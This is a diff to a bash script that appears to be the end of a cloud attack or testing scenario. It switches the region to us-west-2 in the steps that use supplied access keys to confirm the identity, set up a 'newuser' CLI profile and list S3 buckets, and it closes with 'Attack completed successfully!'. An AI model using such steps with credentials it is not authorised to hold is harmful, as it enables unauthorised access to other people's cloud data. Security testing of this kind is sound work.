@@ -36,14 +36,14 @@ sleep 5
 echo "Verifying by calling sts get-caller-identity with inline environment variables:"
 AWS_ACCESS_KEY_ID="${ACCESS_KEY}" \
 AWS_SECRET_ACCESS_KEY="${SECRET_KEY}" \
-AWS_DEFAULT_REGION="us-east-1" \
+AWS_DEFAULT_REGION="us-west-2" \
 sudo aws sts get-caller-identity
 
 # Optionally, configure and use a new sudo AWS CLI profile:
 echo "Configuring new sudo AWS CLI profile 'newuser'..."
 sudo aws configure set aws_access_key_id "${ACCESS_KEY}" --profile newuser
 sudo aws configure set aws_secret_access_key "${SECRET_KEY}" --profile newuser
-sudo aws configure set region us-east-1 --profile newuser
+sudo aws configure set region us-west-2 --profile newuser
 
 echo "Verifying by calling sts get-caller-identity with profile 'newuser':"
 sudo aws sts get-caller-identity --profile newuser
@@ -52,7 +52,7 @@ sudo aws sts get-caller-identity --profile newuser
 echo "Listing S3 buckets using inline environment variables:"
 AWS_ACCESS_KEY_ID="${ACCESS_KEY}" \
 AWS_SECRET_ACCESS_KEY="${SECRET_KEY}" \
-AWS_DEFAULT_REGION="us-east-1" \
+AWS_DEFAULT_REGION="us-west-2" \
 sudo aws s3 ls --profile newuser
 
 echo "Attack completed successfully!"
